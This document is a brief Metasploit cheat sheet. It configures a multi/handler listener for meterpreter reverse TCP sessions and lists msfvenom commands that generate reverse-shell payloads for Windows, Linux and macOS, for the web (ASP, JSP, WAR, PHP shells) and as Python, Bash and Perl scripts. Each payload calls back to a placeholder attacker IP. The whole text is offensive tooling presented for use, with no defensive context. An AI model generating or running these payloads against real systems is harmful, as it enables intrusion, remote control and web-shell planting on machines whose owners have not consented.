<pre>
<B> Handler on Msfconsole </B>
  - use exploit/multi/handler
  - set PAYLOAD windows/meterpreter/reverse_tcp
  - set LHOST localhost
  - set LPORT 4444
  - set ExitOnSession false
  - exploit -j -z

<B> Payload creation with Direct Access to OS </B>
- Windows:
  - msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker IP> LPORT=<Handler Port> -f exe -o payload.exe
  
- Linux:
  - msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Attacker IP> LPORT=<Handler Port> -f elf > payload.elf
  
- Mac:
  - msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Attacker IP> LPORT=<Handler Port> -f macho > payload.macho

<B> Payload creation to exploit through web</B>

- ASP:
  - msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker IP> LPORT=<Handler Port> -f asp > payload.asp
  
- JSP:
  - msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Attacker IP> LPORT=<Handler Port> -f jsp > payload.jsp
  
- WAR:
  - msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Attacker IP> LPORT=<Handler Port> -f war > payload.war

- PHP:
  - msfvenom -p php/meterpreter_reverse_tcp LHOST=<Attacker IP> LPORT=<Handler Port> -f raw > shell.php
  
<B> Payload creation to exploit via scripting</B>
  
- Python:
  - msfvenom -p cmd/unix/reverse_python LHOST=<Attacker IP> LPORT=<Handler Port> -f raw > shell.py

- Bash:

  - msfvenom -p cmd/unix/reverse_bash LHOST=<Attacker IP> LPORT=<Handler Port> -f raw > shell.sh

- Perl:
  - msfvenom -p cmd/unix/reverse_perl LHOST=<Attacker IP> LPORT=<Handler Port> -f raw > shell.pl

</pre>
